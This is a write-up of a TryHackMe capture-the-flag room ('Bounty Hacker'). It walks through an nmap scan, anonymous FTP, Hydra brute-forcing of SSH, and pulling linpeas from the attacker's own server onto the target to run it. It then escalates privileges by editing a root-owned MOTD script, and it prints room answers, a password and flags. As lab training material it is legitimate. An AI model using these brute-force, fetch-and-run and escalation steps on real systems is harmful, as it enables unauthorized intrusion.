# Room

## Disclaimer

This writeup is for a room located on TryHackMe. If you would like to attempt the room, please visit it [here](https://tryhackme.com/room/cowboyhacker).

## Description

You talked a big game about being the most elite hacker in the solar system. Prove it and claim your right to the status of Elite Bounty Hacker!

# Task 1

Deploy the machine by clicking the 'Deploy' button

# Task 2

After the machine has finished booting up, run the following command to reveal the open ports on the network

```
nmap -sV -sC -Pn
```

As we can see there are three open ports

```
21 | ftp
22 | ssh
80 | http
```

# Task 3

Hint: Have you visited FTP?

Thanks to this hint we know to use the ftp server we found in the nmap scan. So, for this to work we need to use the following command

```
ftp ${MachineIP}
```

To log into the ftp server, we will be using anonymous to access the ftp server. This was mentioned in the nmap scan.

After searching around the ftp, we find a file within the dir directory. We notice there is a text file called task.txt. We can view this file directly in the ftp terminal using the following command

```
get task.txt -
```

After finding this task.txt file, we will notice there is another file called locks.txt and it looks like a bunch of strange passwords, lets use a the get command again to save this on out machine for a future task

```
get locks.txt
```

We now have our answer!: <!-- lin -->

# Task 4

Hint: What is on port 22?

This task is just looking for the service running on port 22: <!-- ssh -->

# Task 5

Hint: Hydra may be able to help.

Okay, so we found the answer for task 4, we need to move on from the ftp and now start using ssh on port 22.

Since we discovered the username, we can now ssh, but where is the password?

Since the question mentions hydra, we are going to be using this command to find any available passwords for the user

```
hydra -t 4 -V -l ${User} -P /usr/share/wordlists/locks.txt ssh://${machineIP}
```

Now that we've obtained the password(<!-- RedDr4gonSynd1cat3 -->), lets move on to finding the user.txt file for task 6!

# Task 6

Now to begin accessing the system, we have to ssh in with our credentials. We can use the following command to gain access

```
ssh ${user}@${MachineIP}
```

We're in!

We can also run this within the targets terminal to see if we have root privilages

```
sudo -l
```

After we run a simple command to see the available items in the directory, we see the user.txt file which has our first flag!

```
ls
cat user.txt
```

<!-- THM{CR1M3 SyNd1C4T3} -->

# Task 7

All thats left is to find the root.txt and complete the CTF!

The easiest way to actually accomplish this is by using linpeas & python, so we're gonna start off by getting a python server up and running with the command

(Remember to do this in your root terminal, not as the user)

```
sudo python3 -m http.server 80
```

Now to actually obtain the script, we can create a directoy, wget the actual linPEAS script from the GitHub repository and then transfer the file over to the target machine

```
$ mkdir LinEnum
$ cd LinEnum
~/LinEnum# wget "https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh"
```

Now we need to move back over to the users terminal and we have it saved on our server, lets move it over to the target machine

(Remember to use this command on the target's terminal)

```
wget "http://${PrivateIP}/linpeas.sh"
```

Note:: If using the THM cloud kali linux machine, the PrivateIP is available [here](https://tryhackme.com/my-machine).

To make our linpeas script executable, we simply do this command

(Notice the color change when we run this command)

```
chmod +x linpeas.sh
```

Time to run the script!

```
$ ./linpeas.sh
```

After a few minutes, the script should finish running on the target machine. After sifting through all the returned results, we see a file calle /etc/update-motd.d/00-header (Notice how it's highlighted)

After locating this file, it's time to change the directory over to it

```
$ cd /etc/update-motd.d
$ ls -la
```

This will show us that the 00-header file we found is actually owned by root.

The easiest way to do this is by using nano (I didn't check to see if any other IDE or text ediotrs were available).

```
nano 00-header
```

Now that we have the file open, lets edit the file so that we can access root.txt.

For this we just need to add the following command at the very bottom of the open file

```
cat /root/root.txt
```

ctrl + x to save the file

After completeing all the above tasks, all we have to do is logout of the ssh shell and log back in and you'll see the root.txt flag is located directly in the login terminal screen!

```
ssh ${user}@${MachineIP}
```

Congratulations! Shoutout to [Sevuhl](https://tryhackme.com/p/Sevuhl) for creating such a cool room!

# Extra

This room is based on an anime called Cowboy Bebop (One of my favorites!). You can check it out [here](https://www.imdb.com/title/tt0213338/).

## YouTube Version

I will be posting a video covering this writeup very soon!
